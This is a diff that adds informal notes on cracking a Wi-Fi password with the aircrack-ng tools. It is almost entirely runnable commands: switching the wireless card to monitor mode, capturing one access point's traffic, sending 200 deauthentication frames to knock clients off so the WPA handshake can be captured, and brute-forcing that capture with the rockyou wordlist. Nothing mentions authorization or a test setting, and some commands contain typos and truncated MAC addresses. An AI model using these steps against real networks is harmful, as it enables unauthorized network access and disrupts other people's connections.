@@ -1,2 +1,91 @@
 aicrack-ng        : cmd
 wifite            : gui
+
+
+
+ifconfig
+iwconfig
+
+      wlan0 is in managed mode , 
+                                    we have to change it into monitor mode
+
+sudo airmon-ng  start wlan0    // starting the wireless interface on monitor mode 
+ 
+ iwconfig            // chack the NIC is on monitor mode
+ 
+ 
+ sudo airmon-ng check kill
+ sudo airmon-ng
+ sudo airmon-ng start [name-of-the-interface]
+ 
+ 
+iwconfig
+
+
+// on second terminal
+
+ /*  capture traffic    of wifi   */
+ 
+ airodump-ng wlan0        // wlan0mon / wlan0  is the name of the interface in monitor mode 
+
+
+sudo airodump-ng --bssid  A1:b2:C3:d4:E5:f6  -c 1 --write output wlan0
+
+-c : channel 
+
+
+// 3rd chanel 
+
+// deauthenticate device connected to network and force it to connect back to network        during reconnect process , capture the four way handshake 
+
+
+
+
+sudo aireplay-ng --deauth 200 -a  1:b2:C3:d4:E5:f6 wlan0
+
+
+ls
+
+.cap file
+
+
+// brute-force attack 
+
+
+
+sudo aircrack-ng -b 1:b2:C3:d4:E5:f6 output.cap -w /usr/share/wordlists/rockyou.txt
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+ 
+ 
+                                     
+                                    
+                                    
+                                    
+                                    
+                                    
+                                    
+                                    
+                                    
+                                    
